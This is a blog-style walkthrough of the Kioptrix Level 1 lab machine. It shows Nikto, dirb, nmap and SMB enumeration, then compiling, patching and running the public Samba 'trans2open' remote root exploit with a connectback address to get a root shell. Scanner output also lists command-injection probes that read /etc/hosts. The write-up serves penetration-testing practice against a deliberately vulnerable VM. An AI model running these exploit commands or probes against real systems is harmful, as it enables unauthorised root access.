+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# nikto -h <a href="http://10.183.0.224">http://10.183.0.224</a></div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.224  </div>
+    <div>+ Target Hostname:    10.183.0.224  </div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-05-10 10:20:30 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</span>  (Red-Hat/Linux) <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</span></div>
+    <div>+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</div>
+    <div>+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</div>
+    <div>+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+    <div>+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</div>
+    <div>+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">code execution</span>. CAN-2002-0392.</div>
+    <div>+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</div>
+    <div>+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">overflows in mod_rewrite and mod_cgi</span>. CAN-2003-0542.</div>
+    <div>+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">remote buffer overflow which may allow a remote shell</span>. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082" target="_blank">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082</a>, OSVDB-756.</div>
+    <div>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</div>
+    <div>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</div>
+    <div>+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.</div>
+    <div><span style="color: rgb(41, 41, 41); --inversion-type-color:  simple;">+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span></div>
+    <div>+ OSVDB-3268: /manual/: Directory indexing found.</div>
+    <div>+ OSVDB-3092: /manual/: Web server manual found.</div>
+    <div>+ OSVDB-3268: /icons/: Directory indexing found.</div>
+    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+    <div>+ OSVDB-3092: <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">/test.php</span>: This might be interesting...</div>
+    <div>+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div>
+    <div>+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</div>
+    <div>+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</div>
+    <div>+ /shell?cat+/etc/hosts: A backdoor was identified.</div>
+    <div>+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-05-10 10:21:02 (GMT-4) (32 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>The test.php page returns PHP code that has not been executed.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# curl <a href="http://10.183.0.224/test.php">http://10.183.0.224/test.php</a></div>
+    <div>&lt;?php4</div>
+    <div><br /></div>
+    <div>        print "TEST";</div>
+    <div><br /></div>
+    <div>?&gt;</div>
+</div>
+<div><br /></div>
+<div>This could be because the tags are wrapped with 'php4' or because PHP files are not supported by the server.</div>
+<div><br /></div>
+<div>Next, I'll run dirb to see what else might be on the server.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# dirb <a href="http://10.183.0.224">http://10.183.0.224</a> /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.224.txt</div>
+    <div><br /></div>
+    <div>-----------------</div>
+    <div>DIRB v2.22</div>
+    <div>By The Dark Raver</div>
+    <div>-----------------</div>
+    <div><br /></div>
+    <div>OUTPUT_FILE: dirb-http-10.183.0.224.txt</div>
+    <div>START_TIME: Fri May 10 10:38:25 2019</div>
+    <div>URL_BASE: <a href="http://10.183.0.224/">http://10.183.0.224/</a></div>
+    <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
+    <div><br /></div>
+    <div>-----------------</div>
+    <div><br /></div>
+    <div>GENERATED WORDS: 20458</div>
+    <div><br /></div>
+    <div>---- Scanning URL: <a href="http://10.183.0.224/">http://10.183.0.224/</a> ----</div>
+    <div>+ <a href="http://10.183.0.224/cgi-bin/">http://10.183.0.224/cgi-bin/</a> (CODE:403|SIZE:272)</div>
+    <div>==&gt; DIRECTORY: <a href="http://10.183.0.224/manual/">http://10.183.0.224/manual/</a></div>
+    <div>==&gt; DIRECTORY: <a href="http://10.183.0.224/mrtg/">http://10.183.0.224/mrtg/</a></div>
+    <div>==&gt; DIRECTORY: <a href="http://10.183.0.224/usage/">http://10.183.0.224/usage/</a></div>
+    <div>+ <a href="http://10.183.0.224/~operator">http://10.183.0.224/~operator</a> (CODE:403|SIZE:273)</div>
+    <div>+ <a href="http://10.183.0.224/~root">http://10.183.0.224/~root</a> (CODE:403|SIZE:269)</div>
+    <div><br /></div>
+    <div>---- Entering directory: <a href="http://10.183.0.224/manual/">http://10.183.0.224/manual/</a> ----</div>
+    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
+    <div>    (Use mode '-w' if you want to scan it anyway)</div>
+    <div><br /></div>
+    <div>---- Entering directory: <a href="http://10.183.0.224/mrtg/">http://10.183.0.224/mrtg/</a> ----</div>
+    <div><br /></div>
+    <div>---- Entering directory: <a href="http://10.183.0.224/usage/">http://10.183.0.224/usage/</a> ----</div>
+    <div><br /></div>
+    <div>-----------------</div>
+    <div>END_TIME: Fri May 10 10:41:07 2019</div>
+    <div>DOWNLOADED: 61374 - FOUND: 3</div>
+</div>
+<div><br /></div>
+<div>Checking out the Webalizer page, we see a few URLs listed in the Sep 2009 log.</div>
+<div><br /></div>
+<div><img height="282" src="/assets/images/2019-05-10-kioptrix-level-1-1/68BC5711-FB71-493F-A7AC-332425E37886.png" width="1038" /><br /></div>
+<div><br /></div>
+<div>We also see some user agent strings logged.</div>
+<div><br /></div>
+<div><img height="238" src="/assets/images/2019-05-10-kioptrix-level-1-1/A38DA15D-4C18-4A89-AD8E-E994FCBD4EA0.png" width="1042" /><br /></div>
+<div><br /></div>
+<div>I tried browsing the available sites on the server with the user agent in the log (Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3), but nothing changed. I then decided to try to use curl to "browse" with a malicious user agent string and see if I could get it to run when checking the stats. The log only includes up to 62 characters, so my command will have to be pretty short. Unfortunately, that didn't work either. Webalizer appears to be filtering out tags from the user agent and referrer logs.</div>
+<div><br /></div>
+<div>Looking in the manual directory, I noticed something interesting.</div>
+<div><br /></div>
+<div><a href="http://10.183.0.224/manual/mod/">http://10.183.0.224/manual/mod/</a></div>
+<div><br /></div>
+<div><img height="526" src="/assets/images/2019-05-10-kioptrix-level-1-1/E52E85AF-CFC4-4076-B781-19461C1DD696.png" width="1026" /><br /></div>
+<div><br /></div>
+<div>Looks like mod_perl might be set up on the server. Based on this, plus the fact that 'test.php' wasn't being recognized as PHP code, me thinks PHP is not going to be the language of choice. I also know that MRTG is written in perl, so everything is pointing to the fact that Perl is going to be the only language supported... which is tough to embed in regular HTML pages. Moving on...</div>
+<div><br /></div>
+<div>Looking at the samba service, I decided to use enum4linux to pull a bunch of details. I also ran 'smb-vuln-*' scripts provided by nmap.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# nmap -p 139 --script=smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.183.0.224</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-10 16:49 CDT</div>
+    <div>Nmap scan report for 10.183.0.224</div>
+    <div>Host is up (0.0011s latency).</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>PORT    STATE SERVICE</div>
+    <div>139/tcp open  netbios-ssn</div>
+    <div>MAC Address: 00:0C:29:7C:3A:16 (VMware)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Host script results:</div>
+    <div>| smb-vuln-cve2009-3103: </div>
+    <div>|   VULNERABLE:</div>
+    <div>|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)</div>
+    <div>|     State: VULNERABLE</div>
+    <div>|     IDs:  CVE:CVE-2009-3103</div>
+    <div>|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,</div>
+    <div>|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a</div>
+    <div>|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</div>
+    <div>|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,</div>
+    <div>|           aka "SMBv2 Negotiation Vulnerability."</div>
+    <div>|           </div>
+    <div>|     Disclosure date: 2009-09-08</div>
+    <div>|     References:</div>
+    <div>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</div>
+    <div>|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</div>
+    <div>|_smb-vuln-ms10-054: false</div>
+    <div>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 5.46 seconds</div>
+</div>
+<div><br /></div>
+<div>Googling the CVE, I was able to find the relevant exploit in the exploit database, but of course, this is for Windows, not linux. 😞</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                        | exploits/windows/remote/40280.py</div>
+</div>
+<div><br /></div>
+<div>I noticed that neither nmap nor enum4linux returned the specific Samba version, so I tried to pull it manually using smbclient.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# smbclient -W MYGROUP //10.183.0.224/ipc$ -U''%'' -c q</div>
+</div>
+<div><br /></div>
+<div>This also failed to produce any output, so I stared a packet capture with tshark and ran the command again. Looking at the capture in Wireshark, I can see the Samba version is 2.2.1a.</div>
+<div><br /></div>
+<div><img height="900" src="/assets/images/2019-05-10-kioptrix-level-1-1/DA192E47-8D64-471E-A7B9-83DAC9874B35.png" width="1440" /></div>
+<div><br /></div>
+<div>Searching the exploit database for this version of samba produced a known remote code execution vulnerability.<br /></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                            | exploits/multiple/remote/10.c</div>
+</div>
+<div><br /></div>
+<div>I made a copy of the exploit code, compiled it and ran it to see what the options are.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# cp /usr/share/exploitdb/exploits/multiple/remote/10.c .</div>
+    <div>root@kali:~/Walkthroughs/kioptrix1# gcc -o sambal 10.c </div>
+    <div>root@kali:~/Walkthroughs/kioptrix1# ./sambal </div>
+    <div>samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</div>
+    <div>--------------------------------------------------------------</div>
+    <div>Usage: ./sambal [-bBcCdfprsStv] [host]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)</div>
+    <div>-B &lt;step&gt;       bruteforce steps (default = 300)</div>
+    <div>-c &lt;ip address&gt; connectback ip address</div>
+    <div>-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)</div>
+    <div>-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)</div>
+    <div>-f              force</div>
+    <div>-p &lt;port&gt;       port to attack (default = 139)</div>
+    <div>-r &lt;ret&gt;        return address</div>
+    <div>-s              scan mode (random)</div>
+    <div>-S &lt;network&gt;    scan mode</div>
+    <div>-t &lt;type&gt;       presets (0 for a list)</div>
+    <div>-v              verbose mode</div>
+</div>
+<div><br /></div>
+<div>Looks like we'll need to specify our platform (-b 0), our local IP address (-c 10.183.0.222) and the victim's IP address (10.183.0.224).</div>
+<div><br /></div>
+<div>***NOTE*** I had to modify a line in 10.c to accommodate my IP addressing scheme. The code is checking to make sure there aren't any zeros in the IP address. Since my IP addresses have a zero in the third octet, I was getting an "Invalid IP" error when trying to execute the script. I had to make the following change.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# diff 10.c.old 10.c</div>
+    <div>795c795</div>
+    <div>&lt;                                 if (ip1 == 0 || ip2 == 0 || ip3 == 0 || ip4 == 0) {</div>
+    <div>---</div>
+    <div>&gt;                                 if (ip1 == 0 || ip2 == 0 || ip3 &lt; 0 || ip4 == 0) {</div>
+</div>
+<div><br /></div>
+<div>Once I fixed the IP address check and recompiled, I was able to successfully execute the exploit.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# ./sambal -b0 -c 10.183.0.222 10.183.0.224</div>
+    <div>samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</div>
+    <div>--------------------------------------------------------------</div>
+    <div>+ Bruteforce mode. (Linux)</div>
+    <div>+ Host is running samba.</div>
+    <div>+ Worked!</div>
+    <div>--------------------------------------------------------------</div>
+    <div>*** JE MOET JE MUIL HOUWE</div>
+    <div>Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</div>
+    <div>uid=0(root) gid=0(root) groups=99(nobody)</div>
+</div>
+<div><br /></div>
+<div>And we found another path to root. 😄</div>
+<div><br /></div>
+<div><br /></div>
